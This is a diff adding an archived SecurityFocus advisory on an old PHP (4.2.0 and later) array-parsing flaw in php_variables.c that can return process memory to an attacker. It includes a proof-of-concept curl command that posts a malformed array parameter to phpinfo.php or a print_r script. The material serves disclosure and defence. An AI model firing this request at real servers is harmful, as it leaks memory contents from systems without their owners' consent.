@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/11334/info
+
+A vulnerability is reported to present itself in the array parsing functions of the 'php_variables.c' PHP source file. 
+
+The vulnerability occurs when a PHP script is being used to print URI parameters or data, that are supplied by a third party, into a dynamically generated web page. It is reported that the vulnerable function does not strip certain characters from the user supplied data, this may ultimately be harnessed to manipulate the parsing function into returning regions of process memory to the attacker.
+
+It is reported that this issue only affects PHP versions 4.2.0 and subsequent.
+
+$ curl "http://www.example.com/phpinfo.php" -d `perl -e 'print
+"f"x100;print "[g][=1"'`
+
+where phpinfo.php is:
+<?
+phpinfo();
+?>
+
+or some php file containing print_r function:
+<?
+print_r($_REQUEST);
+?>
